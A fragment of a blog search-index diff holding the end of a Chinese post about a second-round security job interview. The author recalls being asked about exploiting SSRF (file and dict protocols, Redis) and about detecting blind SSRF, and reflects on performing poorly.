+<li>如何利用ssrf</li>
+</ul>
+<p>file协议，dict协议，打redis。（不全）</p>
+<ul>
+<li>没有回显ssrf如何判断</li>
+</ul>
+<p>我说用dnslog回显，他说这个只能判断他出网，不能判断他是否能访问内网，然后不知道了，貌似以前看到过。后面在学学吧。</p>
+<p>二面开始有点紧张，面的很细节，感觉很多没有回答出来，感觉很cccc，感觉简历只面了一半，应该面试官认为我太菜了~~，不想面我了。gg了。长亭二面含金量太高了。</p>
+<p>内推的，直接投，没有人理我。</p>
+<hr>
+]]></content>
+      <categories>
+        <category>经历</category>
+      </categories>
+      <tags>
+        <tag>2021面经</tag>
       </tags>
   </entry>
 </search>
